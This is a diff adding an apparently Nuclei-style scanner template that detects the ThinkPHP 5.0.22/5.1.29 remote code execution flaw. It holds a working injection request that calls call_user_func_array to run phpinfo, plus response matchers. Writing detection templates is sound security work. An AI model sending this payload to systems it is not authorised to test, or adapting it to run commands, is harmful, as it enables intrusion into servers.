@@ -1,0 +1,22 @@
+id: thinkphp-5022-rce
+
+info:
+  name: ThinkPHP 5.0.22 Remote Code Execution
+  author: generated
+  severity: critical
+  description: ThinkPHP 5.0.22/5.1.29 Remote Code Execution via invokefunction.
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+  tags: thinkphp,rce
+
+requests:
+  - method: GET
+    path:
+      - "/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+          - "PHP Extension"
+        condition: and
+        part: body
